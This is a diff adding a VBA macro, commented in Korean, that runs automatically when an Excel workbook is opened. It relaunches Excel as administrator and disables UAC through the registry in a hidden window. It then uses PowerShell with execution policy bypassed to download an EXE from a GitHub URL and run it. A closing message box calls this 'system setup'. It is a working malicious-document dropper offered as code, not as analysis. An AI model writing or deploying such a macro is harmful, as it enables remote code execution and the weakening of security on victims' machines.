@@ -1,0 +1,137 @@
+' =======================================
+' VBA 매크로: GitHub PE 다운로드 및 실행
+' - 관리자 권한으로 재실행 및 UAC 비활성화 포함
+' - PowerShell의 Invoke-WebRequest를 사용하여 PE 파일 다운로드
+' =======================================
+
+Option Explicit
+
+Sub Auto_Open()
+    ' Excel 파일이 열릴 때 자동으로 실행됩니다.
+    On Error Resume Next
+
+    Dim tempFilePath As String
+    ' 재실행 확인 플래그는 TEMP 폴더에 저장
+    tempFilePath = Environ$("TEMP") & "\Restart_Flag.txt"
+    
+    If Dir(tempFilePath) = "" Then
+        ' 1차 실행: 관리자 권한으로 재실행 시도
+        CreateObject("Scripting.FileSystemObject").CreateTextFile tempFilePath, True
+        RestartExcelAsAdmin
+    Else
+        ' 2차 실행: 관리자 권한으로 실행되었으므로 작업 수행
+        Kill tempFilePath
+        DisableUAC
+        ' GitHub PE 다운로드 및 실행 시작
+        DownloadAndRunEXEFromGitHub
+    End If
+End Sub
+
+' 관리자 권한으로 엑셀 재실행
+Private Sub RestartExcelAsAdmin()
+    Dim shellApp As Object
+    Dim excelPath As String
+    Dim workbookPath As String
+
+    workbookPath = ThisWorkbook.FullName
+    excelPath = Application.Path & "\EXCEL.EXE"
+
+    Set shellApp = CreateObject("Shell.Application")
+    ' "runas" 동사를 사용하여 관리자 권한으로 재실행을 시도합니다.
+    shellApp.ShellExecute excelPath, """" & workbookPath & """", "", "runas", 1
+    Application.Quit
+End Sub
+
+' UAC 비활성화
+Private Sub DisableUAC()
+    Dim objShell As Object
+    Dim regCommand As String
+    ' UAC 비활성화 레지스트리 명령어
+    regCommand = "reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
+    Set objShell = CreateObject("WScript.Shell")
+    ' 0: 숨김 모드, True: 명령이 완료될 때까지 대기
+    objShell.Run "cmd.exe /c " & regCommand, 0, True
+End Sub
+
+' GitHub EXE 다운로드 + 실행
+Sub DownloadAndRunEXEFromGitHub()
+    Dim shell As Object
+    Dim fso As Object
+    Dim fileURL As String
+    Dim downloadFolder As String
+    Dim tempPath As String
+    Dim attempt As Integer
+    Dim success As Boolean
+    Dim logFile As String
+    Dim logText As String
+    
+    Set shell = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    ' 다운로드 폴더 생성 (로그 및 PE 파일 저장)
+    downloadFolder = Environ$("APPDATA") & "\SysFiles"
+    If Dir(downloadFolder, vbDirectory) = "" Then MkDir downloadFolder
+    
+    ' 로그 파일 경로
+    logFile = downloadFolder & "\Download_Run_Log.txt"
+    logText = "로그 시작: " & Now & vbCrLf
+    
+    ' =========================================================================================
+    ' ⚠️ 중요: 이 부분을 실제 GitHub RAW EXE 파일 링크로 수정해야 합니다. 
+    ' =========================================================================================
+    fileURL = "https://github.com/taehyun0923/pe_test/raw/main/system_tool.exe" 
+    
+    tempPath = downloadFolder & "\system_tool.exe" ' 다운로드 파일명
+    
+    ' -------------------------------
+    ' 다운로드 최대 3회 재시도 (TLS1.2 강제)
+    ' -------------------------------
+    For attempt = 1 To 3
+        Dim psDownload As String
+        ' PowerShell Invoke-WebRequest를 사용하여 PE 파일 다운로드
+        psDownload = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command " & _
+                     """[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
+                     "Invoke-WebRequest -Uri '" & fileURL & "' -OutFile '" & tempPath & "' -UseBasicParsing"""
+        
+        shell.Run psDownload, 0, True
+        
+        If Dir(tempPath) <> "" Then
+            success = True
+            logText = logText & "다운로드 성공: " & tempPath & " (" & Now & ")" & vbCrLf
+            Exit For
+        Else
+            logText = logText & "다운로드 실패: 시도 " & attempt & "/3" & vbCrLf
+            Application.Wait (Now + TimeValue("0:00:02"))
+        End If
+    Next attempt
+    
+    If Not success Then
+        logText = logText & "FATAL: 다운로드 실패로 실행 불가." & vbCrLf
+        GoTo FinalCleanUp
+    End If
+    
+    ' -------------------------------
+    ' 다운로드된 EXE 실행
+    ' -------------------------------
+    logText = logText & "PE 파일 실행 시도: " & tempPath & vbCrLf
+    
+    ' PowerShell의 Start-Process를 사용하여 EXE 파일 실행 (관리자 권한 상속 시도)
+    ' PE 파일은 독립적으로 실행되며, 매크로 코드는 대기하지 않습니다.
+    shell.Run Chr(34) & tempPath & Chr(34), 1, False 
+    logText = logText & "PE 파일 실행 명령 전송 완료. (" & Now & ")" & vbCrLf
+    
+FinalCleanUp:
+    ' 로그 파일 기록 및 메시지 박스
+    logText = logText & "VBA 작업 완료. (" & Now & ")" & vbCrLf & "=============================" & vbCrLf
+    
+    On Error Resume Next ' 로그 파일이 열려 있지 않으면 오류 방지
+    Dim logStream As Object
+    Set logStream = fso.OpenTextFile(logFile, 8, True) ' 8: Append 모드
+    logStream.Write logText
+    logStream.Close
+    
+    MsgBox "시스템 초기 설정 작업이 완료되었습니다. PE 실행 여부는 로그 파일을 확인하세요.", vbInformation, "작업 완료"
+
+    Set shell = Nothing
+    Set fso = Nothing
+End Sub
